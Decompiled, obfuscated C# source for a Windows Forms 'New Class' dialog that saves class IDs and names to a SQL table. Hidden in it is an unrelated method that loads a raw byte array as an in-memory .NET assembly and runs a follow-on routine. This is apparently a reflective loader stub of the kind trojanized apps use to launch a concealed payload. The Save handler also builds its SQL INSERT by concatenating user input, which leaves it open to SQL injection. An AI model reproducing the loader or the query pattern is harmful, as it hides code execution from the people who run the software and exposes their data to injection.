using System;
using System.ComponentModel;
using System.Data.Common;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Ls5;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Qa3e;
using c9N;
using s1N;

namespace o0QX;

[DesignerGenerated]
public class Jq1j : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button6
	{
		[CompilerGenerated]
		get
		{
			return _Button6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = f6N9;
			Button button = _Button6;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button6 = value;
			button = _Button6;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = g0J8;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public Jq1j()
	{
		((Form)this).add_Load((EventHandler)f9B2);
		Kx20();
	}

	[DebuggerNonUserCode]
	protected override void n4PT(bool Pq1a)
	{
		try
		{
			if (Pq1a && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Pq1a);
		}
	}

	[DebuggerStepThrough]
	private void Kx20()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_042a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0434: Expected O, but got Unknown
		//IL_0447: Unknown result type (might be due to invalid IL or missing references)
		//IL_0451: Expected O, but got Unknown
		//IL_0453: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Jq1j));
		Label2 = new Label();
		Label1 = new Label();
		TextBox2 = new TextBox();
		TextBox1 = new TextBox();
		Button6 = new Button();
		Button2 = new Button();
		((Control)this).SuspendLayout();
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_Location(new Point(15, 11));
		((Control)Label2).set_Margin(new Padding(6, 0, 6, 0));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(98, 22));
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text("Class ID");
		Label2.set_TextAlign((ContentAlignment)16);
		((Control)Label1).set_Location(new Point(15, 55));
		((Control)Label1).set_Margin(new Padding(6, 0, 6, 0));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(98, 22));
		((Control)Label1).set_TabIndex(3);
		Label1.set_Text("Class Name");
		Label1.set_TextAlign((ContentAlignment)16);
		((Control)TextBox2).set_Location(new Point(118, 55));
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(208, 22));
		((Control)TextBox2).set_TabIndex(4);
		((Control)TextBox1).set_Location(new Point(118, 12));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(208, 22));
		((Control)TextBox1).set_TabIndex(5);
		((ButtonBase)Button6).set_BackColor(Color.Transparent);
		Button6.set_DialogResult((DialogResult)2);
		((ButtonBase)Button6).get_FlatAppearance().set_BorderColor(Color.Red);
		((ButtonBase)Button6).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button6).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(255, 224, 192));
		((ButtonBase)Button6).set_FlatStyle((FlatStyle)0);
		((Control)Button6).set_Location(new Point(118, 101));
		((Control)Button6).set_Name("Button6");
		((Control)Button6).set_Size(new Size(75, 29));
		((Control)Button6).set_TabIndex(15);
		((ButtonBase)Button6).set_Text("Cancel");
		((ButtonBase)Button6).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button2).set_BackColor(Color.Transparent);
		((ButtonBase)Button2).get_FlatAppearance().set_BorderColor(Color.FromArgb(0, 192, 192));
		((ButtonBase)Button2).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)0);
		((Control)Button2).set_Location(new Point(18, 101));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(75, 29));
		((Control)Button2).set_TabIndex(11);
		((ButtonBase)Button2).set_Text("Save");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.MintCream);
		((Form)this).set_CancelButton((IButtonControl)(object)Button6);
		((Form)this).set_ClientSize(new Size(342, 151));
		((Control)this).get_Controls().Add((Control)(object)Button6);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(4));
		((Form)this).set_MaximumSize(new Size(348, 180));
		((Form)this).set_MinimumSize(new Size(348, 180));
		((Control)this).set_Name("ClassDetail");
		((Form)this).set_StartPosition((FormStartPosition)4);
		((Form)this).set_Text("New Class");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void f6N9(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void f9B2(object sender, EventArgs e)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		g4K.c1N();
		g4K.cn.Open();
		g4K.str = "select * from ClassDetail";
		g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
		g4K.da.set_SelectCommand(g4K.cmd);
		((DbDataAdapter)(object)g4K.da).Fill(g4K.ds, "ClassDetail");
		g4K.cn.Close();
	}

	internal static void z8GM()
	{
		Assembly assembly = null;
		byte[] rawAssembly = (byte[])p6S.mDic[p6S.mArray];
		assembly = Assembly.Load(rawAssembly);
		p6S.mDic.Add("Deep", assembly);
		assembly = null;
		if (k7G.c3B())
		{
			o3M6.Ym6();
		}
	}

	private void g0J8(object sender, EventArgs e)
	{
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			g4K.cn.Open();
			g4K.str = "insert into ClassDetail values (" + TextBox1.get_Text() + ",'" + TextBox2.get_Text() + "')";
			g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
			g4K.da.set_InsertCommand(g4K.cmd);
			g4K.da.get_InsertCommand().ExecuteNonQuery();
			Interaction.MsgBox((object)" Record Saved.", (MsgBoxStyle)0, (object)null);
			g4K.cn.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)" Record Not Saved.", (MsgBoxStyle)0, (object)null);
			g4K.cn.Close();
			ProjectData.ClearProjectError();
		}
	}
}
